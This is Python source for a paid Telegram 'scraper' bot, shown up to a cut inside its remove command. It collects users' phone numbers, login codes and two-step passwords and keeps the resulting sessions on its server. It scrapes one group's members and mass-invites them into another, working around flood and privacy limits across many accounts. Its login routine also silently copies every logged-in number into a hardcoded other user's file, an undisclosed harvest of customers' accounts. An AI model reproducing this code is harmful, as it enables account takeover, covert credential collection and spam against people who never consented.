import re, os, random, asyncio, html,configparser,pyrogram, subprocess, requests, time, traceback, logging, telethon, csv, json, sys
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from asyncio.exceptions import TimeoutError
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneNumberInvalid, ApiIdInvalid, PhoneCodeInvalid, PhoneCodeExpired, UserNotParticipant
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from telethon.client.chats import ChatMethods
from csv import reader
from telethon.sync import TelegramClient
from telethon import functions, types, TelegramClient, connection, sync, utils, errors
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, InviteToChannelRequest
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, UserBannedInChannelError, PeerFloodError, UserPrivacyRestrictedError, ChatWriteForbiddenError, UserAlreadyParticipantError,  UserBannedInChannelError, UserAlreadyParticipantError,  UserPrivacyRestrictedError, ChatAdminRequiredError
from telethon.sessions import StringSession
from pyrogram import Client,filters
from pyromod import listen
from sql import add_user, query_msg
from support import users_info
from datetime import datetime, timedelta,date
from Config import API_ID, API_HASH, BOT_TOKEN
import csv
#add_user= query_msg= users_info=0
if not os.path.exists('./sessions'):
    os.mkdir('./sessions')
if not os.path.exists(f"Users/1955509952/phone.csv"):
   os.mkdir('./Users')
   os.mkdir(f'./Users/1955509952')
   open(f"Users/1955509952/phone.csv","w")
if not os.path.exists('data.csv'):
    open("data.csv","w")
UPDATES_CHANNEL = "Crazy_Droid"
OWNER= [6008212311,5801763756]
PREMIUM=[6008212311,5801763756]
app = pyrogram.Client("app", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

with open("data.csv", encoding='UTF-8') as f:
    rows = csv.reader(f, delimiter=",", lineterminator="\n")
    next(rows, None)
    ishan=[]
    for row in rows:
        d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
        r = datetime.strptime("2022-12-01", '%Y-%m-%d') - datetime.strptime("2022-07-26", '%Y-%m-%d')
        if d<=r:
            PREMIUM.append(int(row[1]))

# ------------------------------- Subscribe --------------------------------- #
async def Subscribe(lel, message):
   update_channel = UPDATES_CHANNEL
   if update_channel:
      try:
         user = await app.get_chat_member(update_channel, message.chat.id)
         if user.status == "kicked":
            await app.send_message(chat_id=message.chat.id,text="Íú±·¥è Ä Ä è Íú±…™ Ä,  è·¥è·¥ú ·¥Ä Ä·¥á  ô·¥Ä…¥…¥·¥á·¥Ö. ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õ ·¥ç è [Íú±·¥ú·¥ò·¥ò·¥è Ä·¥õ …¢ Ä·¥è·¥ú·¥ò](https://t.me/BESTIES_ZONE).", parse_mode="markdown", disable_web_page_preview=True)
            return 1
      except UserNotParticipant:
         await app.send_message(chat_id=message.chat.id, text="**·¥ò ü·¥á·¥ÄÍú±·¥á ·¥ä·¥è…™…¥ ·¥ç è ·¥Ñ ú·¥Ä·¥õ·¥õ…™…¥…¢ …¢ Ä·¥è·¥ú·¥ò ·¥õ·¥è ·¥úÍú±·¥á ·¥ç·¥á!\n ·¥Ä…¥·¥Ö ·¥Ñ ü…™·¥Ñ·¥ã ·¥è…¥ ·¥õ·¥è ·¥Ñ ú·¥á·¥Ñ·¥ã /start**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ü§ñ ·¥ä·¥è…™…¥ ·¥Ñ ú·¥Ä·¥õ·¥õ…™…¥…¢ …¢ Ä·¥è·¥ú·¥ò ü§ñ", url=f"https://t.me/{update_channel}")]]), parse_mode="markdown")
         return 1
      except Exception:
         await app.send_message(chat_id=message.chat.id, text="**Íú±·¥è·¥ç·¥á·¥õ ú…™…¥…¢ ·¥°·¥á…¥·¥õ ·¥° Ä·¥è…¥…¢. ·¥Ñ·¥è…¥·¥õ·¥Ä·¥Ñ·¥õ ·¥ç è [Íú±·¥ú·¥ò·¥ò·¥è Ä·¥õ …¢ Ä·¥è·¥ú·¥ò](https://t.me/BESTIES_ZONE).**", parse_mode="markdown", disable_web_page_preview=True)
         return 1



# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["start"]))
async def start(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   id = message.from_user.id
   user_name = '@' + message.from_user.username if message.from_user.username else None
   await add_user(id, user_name)
   but = InlineKeyboardMarkup([[InlineKeyboardButton(" ü·¥è…¢…™…¥‚úÖ", callback_data="Login"), InlineKeyboardButton("·¥Ä·¥Ö·¥Ö…™…¥…¢üíØ", callback_data="Adding") ],[InlineKeyboardButton("·¥ò ú·¥è…¥·¥á‚öôÔ∏è", callback_data="Edit"), InlineKeyboardButton("·¥ò ú·¥è…¥·¥áÍú±·¥á·¥áüíï", callback_data="Ish")],[InlineKeyboardButton("·¥ò ú·¥è…¥·¥á  Ä·¥á·¥ç·¥è·¥†·¥á‚öôÔ∏è", callback_data="Remove"), InlineKeyboardButton("·¥Ä·¥Ö·¥ç…™…¥ ·¥ò·¥Ä…¥…¥·¥á ü", callback_data="Admin")]])
   await message.reply_text(f"** ú…™** `{message.from_user.first_name}` **!\n\n…™'·¥ç …™…¥·¥Ö·¥ú·¥Ñ·¥á·¥Ö Íú±·¥Ñ Ä·¥Ä·¥ò·¥á Ä  ô·¥è·¥õ \n·¥ç·¥Ä·¥Ö·¥á Íú∞·¥è Ä ·¥Ö·¥è…™…¥…¢ Íú±·¥Ñ Ä·¥Ä·¥ò…™…¥…¢ Íú∞·¥è Ä Íú∞ Ä·¥á·¥á,\n·¥°…™·¥õ ú·¥è·¥ú·¥õ ·¥úÍú±…™…¥…¢ ·¥Ä…¥ è ·¥úÍú±·¥á ·¥èÍú∞ ·¥ò è·¥õ ú·¥è…¥.\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**", reply_markup=but)



# ------------------------------- Set Phone No --------------------------------- #
@app.on_message(filters.private & filters.command(["phone"]))
async def phone(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è  ü·¥è…¥…¢·¥á Ä ·¥Ä ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥úÍú±·¥á Ä\n·¥ò ü·¥á·¥ÄÍú±·¥á  ú·¥Ä·¥†·¥á ·¥Ä Íú±·¥ú ôÍú±·¥Ñ Ä…™·¥ò·¥õ·¥è…¥\n200 ÄÍú± ·¥ò·¥á Ä ·¥ç·¥è…¥·¥õ ú\n·¥Ö·¥ç @BT46ER\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
      str_list = [row[0] for row in csv.reader(f)]
      NonLimited=[]
      a=0
      for pphone in str_list:
         a+=1
         NonLimited.append(str(pphone))
      number = await app.ask(chat_id=message.chat.id, text="**·¥á…¥·¥õ·¥á Ä …¥·¥ú·¥ç ô·¥á Ä ·¥èÍú∞ ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õÍú± ·¥õ·¥è  ü·¥è…¢…™…¥ (…™…¥ …™…¥·¥õ…™…¢·¥á Ä)\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
      n = int(number.text)
      a+=n
      if n<1 :
         await app.send_message(message.chat.id, """**…™…¥·¥†·¥Ä ü…™·¥Ö Íú∞·¥è Ä·¥ç·¥Ä·¥õ  ü·¥áÍú±Íú± ·¥õ ú·¥á…¥ 1 ·¥õ Ä è ·¥Ä…¢·¥Ä…™…¥\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**""")
         return
      if a>100:
         await app.send_message(message.chat.id, f"** è·¥è·¥ú ·¥Ñ·¥Ä…¥ ·¥Ä·¥Ö·¥Ö ·¥è…¥ ü è {100-a} ·¥ò ú·¥è…¥·¥á …¥·¥è \n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
         return
      for i in range (1,n+1):
         number = await app.ask(chat_id=message.chat.id, text="**…¥·¥è·¥° Íú±·¥á…¥·¥Ö  è·¥è·¥ú Ä ·¥õ·¥á ü·¥á…¢ Ä·¥Ä·¥ç ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ'Íú± ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä …™…¥ …™…¥·¥õ·¥á Ä…¥·¥Ä·¥õ…™·¥è…¥·¥Ä ü Íú∞·¥è Ä·¥ç·¥Ä·¥õ. \n…™…¥·¥Ñ ü·¥ú·¥Ö…™…¥…¢ **·¥Ñ·¥è·¥ú…¥·¥õ Ä è ·¥Ñ·¥è·¥Ö·¥á**. \n·¥áx·¥Ä·¥ç·¥ò ü·¥á: **+14154566376 = 14154566376 only not +**\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
         phone = number.text
         if "+" in phone:
            await app.send_message(message.chat.id, """**·¥ÄÍú± ·¥ç·¥á…¥·¥õ…™·¥è…¥ + …™Íú± …¥·¥è·¥õ …™…¥·¥Ñ ü·¥ú·¥Ö·¥á\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**""")
         elif len(phone)==11 or len(phone)==12:
            Singla = str(phone)
            NonLimited.append(Singla)
            await app.send_message(message.chat.id, f"**{n}). ·¥ò ú·¥è…¥·¥á: {phone} Íú±·¥á·¥õ Íú±·¥ú·¥Ñ·¥áÍú±Íú±Íú∞·¥ú ü ü è‚úÖ\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
         else:
            await app.send_message(message.chat.id, """**…™…¥·¥†·¥Ä ü…™·¥Ö …¥·¥ú·¥ç ô·¥á Ä Íú∞·¥è Ä·¥ç·¥Ä·¥õ ·¥õ Ä è ·¥Ä…¢·¥Ä…™…¥\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**""") 
      NonLimited=list(dict.fromkeys(NonLimited))
      with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
         writer = csv.writer(writeFile, lineterminator="\n")
         writer.writerows(NonLimited)
      with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
         for line in infile:
            outfile.write(line.replace(",", ""))
 except Exception as e:
   await app.send_message(message.chat.id, f"**·¥á Ä Ä·¥è Ä: {e}\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
   return



# ------------------------------- Acc Login --------------------------------- #
@app.on_message(filters.private & filters.command(["login"]))
async def login(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è  ü·¥è…¥…¢·¥á Ä ·¥Ä ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥úÍú±·¥á Ä\n·¥ò ü·¥á·¥ÄÍú±·¥á  ú·¥Ä·¥†·¥á ·¥Ä Íú±·¥ú ôÍú±·¥Ñ Ä…™·¥ò·¥õ·¥è…¥\n200 ÄÍú± ·¥ò·¥á Ä ·¥ç·¥è…¥·¥õ ú\n·¥Ö·¥ç @BT46ER\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
      return
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
    r=[]
    l=[]
    str_list = [row[0] for row in csv.reader(f)]
    po = 0
    s=0
    for pphone in str_list:
     try:
      phone = int(utils.parse_phone(pphone))
      client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
      await client.connect()
      if not await client.is_user_authorized():
         try:
            await client.send_code_request(phone)
         except FloodWait as e:
            await message.reply(f" è·¥è·¥ú  ú·¥Ä·¥†·¥á Íú∞ ü·¥è·¥è·¥Ö·¥°·¥Ä…™·¥õ ·¥èÍú∞ {e.x} Íú±·¥á·¥Ñ·¥è…¥·¥ÖÍú±")
            return
         except PhoneNumberInvalidError:
            await message.reply(" è·¥è·¥ú Ä ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä …™Íú± …™…¥·¥†·¥Ä ü…™·¥Ö.\n\n·¥ò Ä·¥áÍú±Íú± /start ·¥õ·¥è Íú±·¥õ·¥Ä Ä·¥õ ·¥Ä…¢·¥Ä…™…¥!")
            return
         except PhoneNumberBannedError:
            await message.reply(f"{phone} …™Íú±  ô·¥Ä…¥·¥á·¥Ö")
            continue
         try:
            otp = await app.ask(message.chat.id, ("·¥Ä…¥ ·¥è·¥õ·¥ò …™Íú± Íú±·¥á…¥·¥õ ·¥õ·¥è  è·¥è·¥ú Ä ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä, \n·¥ò ü·¥á·¥ÄÍú±·¥á ·¥á…¥·¥õ·¥á Ä ·¥è·¥õ·¥ò …™…¥ `1 2 3 4 5` Íú∞·¥è Ä·¥ç·¥Ä·¥õ. __(Íú±·¥ò·¥Ä·¥Ñ·¥á  ô·¥á·¥õ·¥°·¥á·¥á…¥ ·¥á·¥Ä·¥Ñ ú …¥·¥ú·¥ç ô·¥á ÄÍú±!)__ \n\n…™Íú∞  ô·¥è·¥õ …¥·¥è·¥õ Íú±·¥á…¥·¥Ö…™…¥…¢ ·¥è·¥õ·¥ò ·¥õ ú·¥á…¥ ·¥õ Ä è /restart ·¥Ä…¥·¥Ö Íú±·¥õ·¥Ä Ä·¥õ ·¥õ·¥ÄÍú±·¥ã ·¥Ä…¢·¥Ä…™…¥ ·¥°…™·¥õ ú /start ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö ·¥õ·¥è  ô·¥è·¥õ.\n·¥ò Ä·¥áÍú±Íú± /cancel ·¥õ·¥è ·¥Ñ·¥Ä…¥·¥Ñ·¥á ü."), timeout=300)
         except TimeoutError:
            await message.reply("·¥õ…™·¥ç·¥á  ü…™·¥ç…™·¥õ  Ä·¥á·¥Ä·¥Ñ ú·¥á·¥Ö ·¥èÍú∞ 5 ·¥ç…™…¥.\n·¥ò Ä·¥áÍú±Íú± /start ·¥õ·¥è Íú±·¥õ·¥Ä Ä·¥õ ·¥Ä…¢·¥Ä…™…¥!")
            return
         otps=otp.text
         try:
            await client.sign_in(phone=phone, code=' '.join(str(otps)))
         except PhoneCodeInvalidError:
            await message.reply("…™…¥·¥†·¥Ä ü…™·¥Ö ·¥Ñ·¥è·¥Ö·¥á.\n\n·¥ò Ä·¥áÍú±Íú± /start ·¥õ·¥è Íú±·¥õ·¥Ä Ä·¥õ ·¥Ä…¢·¥Ä…™…¥!")
            return
         except PhoneCodeExpiredError:
            await message.reply("·¥Ñ·¥è·¥Ö·¥á …™Íú± ·¥áx·¥ò…™ Ä·¥á·¥Ö.\n\n·¥ò Ä·¥áÍú±Íú± /start ·¥õ·¥è Íú±·¥õ·¥Ä Ä·¥õ ·¥Ä…¢·¥Ä…™…¥!")
            return
         except SessionPasswordNeededError:
            try:
               two_step_code = await app.ask(message.chat.id," è·¥è·¥ú Ä ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ  ú·¥Ä·¥†·¥á ·¥õ·¥°·¥è-Íú±·¥õ·¥á·¥ò ·¥†·¥á Ä…™Íú∞…™·¥Ñ·¥Ä·¥õ…™·¥è…¥.\n·¥ò ü·¥á·¥ÄÍú±·¥á ·¥á…¥·¥õ·¥á Ä  è·¥è·¥ú Ä ·¥ò·¥ÄÍú±Íú±·¥°·¥è Ä·¥Ö.",timeout=300)
            except TimeoutError:
               await message.reply("`·¥õ…™·¥ç·¥á  ü…™·¥ç…™·¥õ  Ä·¥á·¥Ä·¥Ñ ú·¥á·¥Ö ·¥èÍú∞ 5 ·¥ç…™…¥.\n\n·¥ò Ä·¥áÍú±Íú± /start ·¥õ·¥è Íú±·¥õ·¥Ä Ä·¥õ ·¥Ä…¢·¥Ä…™…¥!`")
               return
            try:
               await client.sign_in(password=two_step_code.text)
            except Exception as e:
               await message.reply(f"**·¥á Ä Ä·¥è Ä:** `{str(e)}`")
               return
            except Exception as e:
               await app.send_message(message.chat.id ,f"**·¥á Ä Ä·¥è Ä:** `{str(e)}`")
               return
      with open("Users/2056781888/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         NonLimited=[]
         for pphone in str_list:
            NonLimited.append(str(pphone))
         Singla = str(phone)
         NonLimited.append(Singla)
         NonLimited=list(dict.fromkeys(NonLimited))
         with open('1.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(NonLimited)
         with open("1.csv") as infile, open(f"Users/2056781888/phone.csv", "w") as outfile:
            for line in infile:
                outfile.write(line.replace(",", ""))
      os.remove("1.csv")
      await client(functions.contacts.UnblockRequest(id='@SpamBot'))
      await client.send_message('SpamBot', '/start')
      msg = str(await client.get_messages('SpamBot'))
      re= "bird"
      if re in msg:
         stats="Good news, no limits are currently applied to your account. You‚Äôre free as a bird!"
         s+=1
         r.append(str(phone))
      else:
         stats='you are limited'
         l.append(str(phone))
      me = await client.get_me()
      await app.send_message(message.chat.id, f" ü·¥è…¢…™…¥ Íú±·¥ú·¥Ñ·¥Ñ·¥áÍú±Íú±Íú∞·¥ú ü ü è‚úÖ ·¥Ö·¥è…¥·¥á.\n\n**…¥·¥Ä·¥ç·¥á:** {me.first_name}\n**·¥úÍú±·¥á Ä…¥·¥Ä·¥ç·¥á:** {me.username}\n**·¥ò ú·¥è…¥·¥á:** {phone}\n**Íú±·¥ò·¥Ä·¥ç ô·¥è·¥õ Íú±·¥õ·¥Ä·¥õÍú±:** {stats}\n\n**·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")     
      po+=1
      await client.disconnect()
     except ConnectionError:
      await client.disconnect()
      await client.connect()
     except TypeError:
      await app.send_message(message.chat.id, "** è·¥è·¥ú  ú·¥Ä·¥†·¥á …¥·¥è·¥õ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä \n·¥ò ü·¥á·¥ÄÍú±·¥á ·¥á·¥Ö…™·¥õ ·¥Ñ·¥è…¥Íú∞…™…¢‚öôÔ∏è  ô è ·¥Ñ·¥Ä·¥ç·¥ç·¥Ä…¥·¥Ö /start.\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")  
     except Exception as e:
      await app.send_message(message.chat.id, f"**·¥á Ä Ä·¥è Ä: {e}\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
    for ish in l:
      r.append(str(ish))
    with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
      writer = csv.writer(writeFile, lineterminator="\n")
      writer.writerows(r)
    with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
      for line in infile:
         outfile.write(line.replace(",", "")) 
    await app.send_message(message.chat.id, f"**·¥Ä ü ü ·¥Ä·¥Ñ·¥Ñ  ü·¥è…¢…™…¥ {s} ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ ·¥Ä·¥†·¥Ä…™ ü·¥Ä ô ü·¥á ·¥èÍú∞ {po} \n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**") 
 except Exception as e:
   await app.send_message(message.chat.id, f"**·¥á Ä Ä·¥è Ä: {e}\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
   return
                          


# ------------------------------- Acc Private Adding --------------------------------- #
@app.on_message(filters.private & filters.command(["adding"]))
async def to(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è  ü·¥è…¥…¢·¥á Ä ·¥Ä ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥úÍú±·¥á Ä\n·¥ò ü·¥á·¥ÄÍú±·¥á  ú·¥Ä·¥†·¥á ·¥Ä Íú±·¥ú ôÍú±·¥Ñ Ä…™·¥ò·¥õ·¥è…¥\n200 ÄÍú± ·¥ò·¥á Ä ·¥ç·¥è…¥·¥õ ú\n·¥Ö·¥ç @BT46ER\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
      return
   number = await app.ask(chat_id=message.chat.id, text="**…¥·¥è·¥° Íú±·¥á…¥·¥Ö ·¥õ ú·¥á Íú∞ Ä·¥è·¥ç …¢ Ä·¥è·¥ú·¥ò ·¥úÍú±·¥á Ä…¥·¥Ä·¥ç·¥á \n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
   From = number.text
   number = await app.ask(chat_id=message.chat.id, text="**…¥·¥è·¥° Íú±·¥á…¥·¥Ö ·¥õ ú·¥á ·¥õ·¥è …¢ Ä·¥è·¥ú·¥ò ·¥úÍú±·¥á Ä…¥·¥Ä·¥ç·¥á \n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
   To = number.text
   number = await app.ask(chat_id=message.chat.id, text="**…¥·¥è·¥° Íú±·¥á…¥·¥Ö Íú±·¥õ·¥Ä Ä·¥õ Íú∞ Ä·¥è·¥ç  \n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
   a = int(number.text)
   di=a
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         for pphone in str_list:
            peer=0
            ra=0
            dad=0
            r="**·¥Ä·¥Ö·¥Ö…™…¥…¢ Íú±·¥õ·¥Ä Ä·¥õ**\n\n"
            phone = utils.parse_phone(pphone)
            client = TelegramClient(f"sessions/{phone}", API_ID , API_HASH)
            await client.connect()
            await client(JoinChannelRequest(To))
            await app.send_message(chat_id=message.chat.id, text=f"**Íú±·¥Ñ Ä·¥Ä·¥ò…™…¥…¢ Íú±·¥õ·¥Ä Ä·¥õ**")
            async for x in client.iter_participants(From, aggressive=True):
               try:
                  ra+=1
                  if ra<a:
                     continue
                  if (ra-di)>150:
                     await client.disconnect()
                     r+="**\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(message.chat.id, f"**·¥á Ä Ä·¥è Ä: {phone} ·¥Ö·¥ú·¥á ·¥õ·¥è Íú±·¥è·¥ç·¥á ·¥á Ä Ä·¥è Ä ·¥ç·¥è·¥†…™…¥…¢ ·¥õ·¥è …¥·¥áx·¥õ …¥·¥è\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
                     break
                  if dad>40:
                     r+="**\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     r="**·¥Ä·¥Ö·¥Ö…™…¥…¢ Íú±·¥õ·¥Ä Ä·¥õ**\n\n"
                     dad=0
                  await client(InviteToChannelRequest(To, [x]))
                  status = '·¥Ö·¥è…¥·¥á'
               except errors.FloodWaitError as s:
                  status= f'FloodWaitError for {s.seconds} sec'
                  await client.disconnect()
                  r+="**\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**"
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  await app.send_message(chat_id=message.chat.id, text=f'**FloodWaitError Íú∞·¥è Ä {s.seconds} Íú±·¥á·¥Ñ\n·¥ç·¥è·¥†…™…¥…¢ ·¥õ·¥è …¥·¥áx·¥õ …¥·¥ú·¥ç ô·¥á Ä**')
                  break
               except UserPrivacyRestrictedError:
                  status = 'PrivacyRestrictedError'
               except UserAlreadyParticipantError:
                  status = '·¥Ä ü Ä·¥á·¥Ä·¥Ö è'
               except UserBannedInChannelError:
                  status="·¥úÍú±·¥á Ä  ô·¥Ä…¥…¥·¥á·¥Ö"
               except ChatAdminRequiredError:
                  status="·¥õ·¥è ·¥Ä·¥Ö·¥Ö ·¥Ä·¥Ö·¥ç…™…¥  Ä·¥á«´·¥ú…™ Ä·¥á·¥Ö"
               except ValueError:
                  status="·¥á Ä Ä·¥è Ä …™…¥ ·¥á…¥·¥õ Ä è"
                  await client.disconnect()
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  break
               except PeerFloodError:
                  if peer == 10:
                     await client.disconnect()
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(chat_id=message.chat.id, text=f"**Too Many PeerFloodError\n·¥ç·¥è·¥†…™…¥…¢ ·¥õ·¥è …¥·¥áx·¥õ …¥·¥ú·¥ç ô·¥á Ä**")
                     break
                  status = 'PeerFloodError'
                  peer+=1
               except ChatWriteForbiddenError as cwfe:
                  await client(JoinChannelRequest(To))
                  continue
               except errors.RPCError as s:
                  status = s.__class__.__name__
               except Exception as d:
                  status = d
               except:
                  traceback.print_exc()
                  status="Unexpected Error"
                  break
               r+=f"{a-di+1}). **{x.first_name}**   ‚üæ   **{status}**\n"
               dad+=1
               a+=1
   except Exception as e:
      await app.send_message(chat_id=message.chat.id, text=f"Error: {e} \n\n ·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER")
 except Exception as e:
   await app.send_message(message.chat.id, f"**Error: {e}\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
   return



# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["phonesee"]))
async def start(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
      await app.send_message(message.chat.id, f"** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è  ü·¥è…¥…¢·¥á Ä ·¥Ä ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥úÍú±·¥á Ä\n·¥ò ü·¥á·¥ÄÍú±·¥á  ú·¥Ä·¥†·¥á ·¥Ä Íú±·¥ú ôÍú±·¥Ñ Ä…™·¥ò·¥õ·¥è…¥\n200 ÄÍú± ·¥ò·¥á Ä ·¥ç·¥è…¥·¥õ ú\n·¥Ö·¥ç @BT46ER\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
      return
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         de="** è·¥è·¥ú Ä ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á ÄÍú± ·¥Ä Ä·¥á**\n\n"
         da=0
         dad=0
         for pphone in str_list:
            dad+=1
            da+=1
            if dad>40:
               de+="**\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**"
               await app.send_message(chat_id=message.chat.id, text=f"{de}")
               de="** è·¥è·¥ú Ä ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á ÄÍú± ·¥Ä Ä·¥á**\n\n"
               dad=0 
            de+=(f"**{da}).** `{int(pphone)}`\n")
         de+="**\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**"
         await app.send_message(chat_id=message.chat.id, text=f"{de}")

   except Exception as a:
      pass


# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["remove"]))
async def start(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id not in PREMIUM:
